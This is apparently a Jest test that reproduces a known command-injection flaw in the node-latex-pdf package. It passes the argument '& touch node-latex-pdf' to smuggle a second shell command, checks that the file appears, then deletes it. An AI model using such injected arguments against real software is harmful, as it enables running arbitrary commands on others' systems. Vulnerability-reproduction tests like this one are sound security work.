//https://snyk.io/vuln/SNYK-JS-NODELATEXPDF-1050426
test("Command Injection in node-latex-pdf", () => 
{
	const a =require("node-latex-pdf");
	const fs = require('fs')
	const path = './node-latex-pdf'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	a("./","& touch node-latex-pdf",function(){})
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
